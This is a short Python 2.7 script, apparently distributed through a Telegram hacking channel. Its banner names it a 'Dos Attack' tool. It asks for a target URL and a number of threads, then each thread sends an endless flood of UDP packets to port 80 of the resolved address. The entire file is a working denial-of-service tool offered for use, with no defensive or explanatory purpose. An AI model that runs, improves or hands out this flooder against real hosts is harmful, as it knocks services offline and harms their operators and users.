#!/usr/bin/python2.7

import socket,sys,thread
from time import sleep

def menu():
	print("""
	##############################
	#         Dos Attack         #
	#  The Commander_> Epic_R_R  #
	#       T.me/allhak          #
	##############################
		""")
def inputt():
	global target_ip, thread_count,MESSAGE,PORT
	target_addr = raw_input('Enter the URL[ENTER]: ')
	thread_count = input('Enter the counts of thread you wish to lunch [ENTER]: ')
	target_ip = socket.gethostbyname(target_addr)
	PORT = 80
	MESSAGE = "DOS ATTACK ! "
	print ("target IP: {}".format(target_ip))
	print ("target port: {}".format(PORT))
	sleep(2)

menu()
inputt()

def dos(i):
	while True:
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(MESSAGE, (target_ip, PORT))
		print ("Packet Sent")

for i in xrange(thread_count):
		try:
			thread.start_new_thread(dos, ('Thread-'+str(i),))
		except KeyboardInterrupt:
			sys.exit(0)
